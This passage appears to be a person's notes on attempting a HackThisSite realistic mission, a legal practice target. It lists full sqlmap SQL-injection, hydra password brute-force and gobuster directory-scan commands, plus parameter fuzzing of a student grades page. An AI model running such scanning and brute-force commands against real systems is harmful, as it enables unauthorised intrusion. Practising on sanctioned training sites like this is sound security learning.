I tried searching for sqli in `staff.php` but didn't find.
sqlmap:
```bash
# For staff.php
sqlmap -u "https://www.hackthissite.org/missions/realistic/10/staff.php" --cookie="HackThisSite=X" --proxy=http://127.0.0.1:8080 --data="username=test&password=test" --headers="Referer: https://www.hackthissite.org/missions/realistic/10/staff.php"

# For student.php
sqlmap -u "https://www.hackthissite.org/missions/realistic/10/student.php?uusername=Zach%20Sanchez&ppassword=liberty638&action=viewgrades&course=Computer" --cookie="HackThisSite=X" --proxy=http://127.0.0.1:8080 --headers="Referer: https://www.hackthissite.org/missions/realistic/10/student.php" -v
```

I tried to look any of these words:
```
insert, update, delete, create, remove, replace, modify, change, edit, add, append, prepend, set, get, fetch, read, write, load, save, store, send, receive, upload, download, copy, move, rename, merge, split, join, select, search, find, filter, sort, list, show, hide, enable, disable, start, stop, run, execute, open, close, connect, disconnect, login, logout, register, submit, cancel, reset, clear, refresh, reload, import, export, parse, encode, decode, encrypt, decrypt, hash, verify, validate, check, test, build, compile, install, uninstall, grant, revoke, allow, deny, block, unlock, lock, publish, archive, restore, sync, push, pull, commit, rollback, query, request, response, redirect, forward, process, handle, trigger, generate, convert, transform, invoke, call, return, view, record, assign, enter, calculate, recalculate, adjust, correct, approve, review, finalize, post, release, average, score, grade, mark, evaluate, assess
```
in the request:
```d
GET /missions/realistic/10/student.php?uusername=Zach%20Sanchez&ppassword=liberty638&action={WORD}grades&course=Gym HTTP/2
```
since the following works:
```d
GET /missions/realistic/10/student.php?uusername=Zach%20Sanchez&ppassword=liberty638&action=viewgrades&course=Gym HTTP/2
```
but none of them worked other than `view`.

Also tried in hydra to brute force passwords in `/staff.php`:
```bash
HYDRA_PROXY_HTTP="http://127.0.0.1:8080" hydra -I -L staff_names.txt -P passwords.txt -s 443 -m '/missions/realistic/10/staff.php:username=^USER^&password=^PASS^:H=Cookie\: HackThisSite=X:Invali' www.hackthissite.org http-post-form -S -o hydra-output.txt -vV -t 3 -c 0.1
```
Passwords tested:
```
password
pass
admin
liberty638
```
Also had gobuster but didn't find anything:
```bash
gobuster dir -u https://www.hackthissite.org/missions/realistic/10 -c 'HackThisSite=X' -w /snap/seclists/current/Discovery/Web-Content/common.txt --exclude-length 381
```
I then looked at the images one of the image